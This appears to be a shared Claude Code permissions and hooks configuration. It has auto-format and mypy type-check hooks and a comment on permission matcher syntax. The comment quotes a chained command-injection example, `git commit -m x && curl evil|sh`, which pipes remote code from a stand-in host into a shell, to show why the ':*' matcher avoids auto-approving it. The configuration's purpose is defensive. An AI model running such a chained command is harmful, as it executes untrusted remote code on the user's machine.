//: SHARED, committed Claude Code permissions + hooks. Safe, portable, reviewable. Use the ':*'
prefix matcher (e.g. "git commit:*"), NOT a bare-space glob ("git commit *"): ':*' respects
command boundaries, so a chained escape like `git commit -m x && curl evil|sh` is NOT
auto-approved. Machine-specific paths and higher-privilege conveniences belong in

PostToolUse.//: Auto-format any Python file the moment Claude writes or edits it, so formatting never drifts.

hooks.command: jq -r '.tool_input.file_path // empty' | { read -r f; case "$f" in *.py|*.pyi) uv run ruff format "$f";; esac; } >/dev/null 2>&1 || true

Stop.//: Type-check src/ when Claude finishes a turn; surface any mypy errors back into the session.

hooks.command: o=$(uv run mypy src 2>&1); s=$?; [ $s -ne 0 ] && printf '%s' "$o" | jq -Rs '{systemMessage: ("mypy type errors in src/:\n" + .)}'; true
